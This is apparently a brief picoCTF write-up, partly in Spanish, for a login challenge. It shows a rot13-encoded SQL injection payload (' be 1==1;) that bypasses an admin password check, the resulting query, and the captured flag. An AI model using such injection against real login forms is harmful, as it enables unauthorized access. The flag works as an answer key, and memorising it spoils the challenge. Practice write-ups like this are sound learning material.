## Objetivo

There is a secure website running at `https://jupiter.challenges.picoctf.org/problem/29132/` ([link](https://jupiter.challenges.picoctf.org/problem/29132/)) or http://jupiter.challenges.picoctf.org:29132. Try to see if you can login as admin!

## Datos de Acceso al Nivel

 ([link](https://jupiter.challenges.picoctf.org/problem/29132/))
## Solucion

```
password: ' be 1==1;
SQL query: SELECT * FROM admin where password = '' or 1==1;'

# Logged in!

Your flag is: picoCTF{3v3n_m0r3_SQL_06a9db19}
```

## Notas Adicionales

Se pone la misma inyeccion sql y nos percatamos de que la pagina lo convierte a rot13, entoncces metemos la misma inyeccion pero ya en rot13

## Referencias
[CyberChef](https://gchq.github.io/CyberChef/)
